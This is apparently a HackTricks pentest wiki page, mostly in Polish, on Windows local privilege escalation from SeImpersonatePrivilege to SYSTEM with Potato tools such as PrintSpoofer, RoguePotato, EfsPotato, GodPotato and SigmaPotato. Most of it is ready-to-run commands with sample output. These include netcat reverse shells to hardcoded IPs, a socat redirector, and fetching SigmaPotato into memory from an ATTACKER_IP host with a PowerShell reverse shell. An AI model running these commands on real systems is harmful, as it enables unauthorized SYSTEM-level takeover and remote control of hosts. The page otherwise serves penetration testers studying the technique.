# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i typowe pułapki

Wszystkie poniższe techniki opierają się na nadużyciu uprzywilejowanej usługi umożliwiającej impersonację z kontekstu posiadającego jedno z poniższych uprawnień:

- SeImpersonatePrivilege (najczęściej) lub SeAssignPrimaryTokenPrivilege
- Wysoki poziom integralności nie jest wymagany, jeśli token już posiada SeImpersonatePrivilege (typowe dla wielu kont usługowych, takich jak IIS AppPool, MSSQL itp.)

Szybkie sprawdzenie uprawnień:
```cmd
whoami /priv | findstr /i impersonate
```
Uwagi operacyjne:

- Jeśli twój shell działa pod ograniczonym tokenem bez SeImpersonatePrivilege (częste dla Local Service/Network Service w niektórych kontekstach), odzyskaj domyślne uprawnienia konta używając FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i dostępna przez lokalny endpoint RPC (spoolss). W zaostrzonych środowiskach, gdzie Spooler został wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga OXID resolver dostępnego na TCP/135. Jeśli egress jest zablokowany, użyj redirector/port-forwardera (zobacz przykład niżej). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, spróbuj alternatywnych pipe'ów (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zwykle wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innego pipe/transportu lub upewnij się, że docelowa usługa jest uruchomiona.

## Szybkie demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notatki:
- Możesz użyć -i, aby uruchomić interaktywny proces w bieżącej konsoli, lub -c, aby wykonać one-liner.
- Wymaga usługi Spooler. Jeśli jest wyłączona, to się nie powiedzie.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli outbound 135 jest zablokowany, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato to nowsza prymitywna metoda nadużycia COM opublikowana pod koniec 2022, która celuje w usługę **PrintNotify** zamiast Spooler/BITS. Binarka instancjuje serwer COM PrintNotify, podstawia fałszywy `IUnknown`, a następnie wywołuje uprzywilejowane wywołanie zwrotne przez `CreatePointerMoniker`. Gdy usługa PrintNotify (działająca jako **SYSTEM**) łączy się z powrotem, proces duplikuje zwrócony token i uruchamia dostarczony payload z pełnymi uprawnieniami.

Key operational notes:

* Działa na Windows 10/11 oraz Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest obecna nawet gdy stary Spooler jest wyłączony po PrintNightmare).
* Wymaga, aby kontekst wywołujący posiadał uprawnienie **SeImpersonatePrivilege** (typowo dla IIS APPPOOL, MSSQL i kont usług zadań zaplanowanych).
* Akceptuje albo bezpośrednie polecenie, albo tryb interaktywny, dzięki czemu możesz pozostać w oryginalnej konsoli. Przykład:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Ponieważ jest w pełni oparty na COM, nie wymaga nasłuchiwania named-pipe ani zewnętrznych redirectorów, co czyni go prostym zamiennikiem na hostach, gdzie Defender blokuje RoguePotato’s RPC binding.

Operatorzy tacy jak Ink Dragon uruchamiają PrintNotifyPotato natychmiast po uzyskaniu ViewState RCE na SharePoint, aby przejść z procesu `w3wp.exe` worker do SYSTEM przed zainstalowaniem ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wskazówka: Jeśli jedna pipe zawiedzie lub EDR ją zablokuje, spróbuj innych obsługiwanych pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Uwagi:
- Działa na Windows 8/8.1–11 i Server 2012–2022, gdy obecne jest uprawnienie SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwie odmiany celujące w obiekty DCOM usług, które domyślnie mają ustawiony RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binariów i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution via .NET reflection oraz PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Źródła

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Przywróć domyślne uprawnienia tokenów dla kont usługowych](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Ujawnienie sieci przekaźników i wewnętrznych mechanizmów skrytej ofensywnej operacji](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
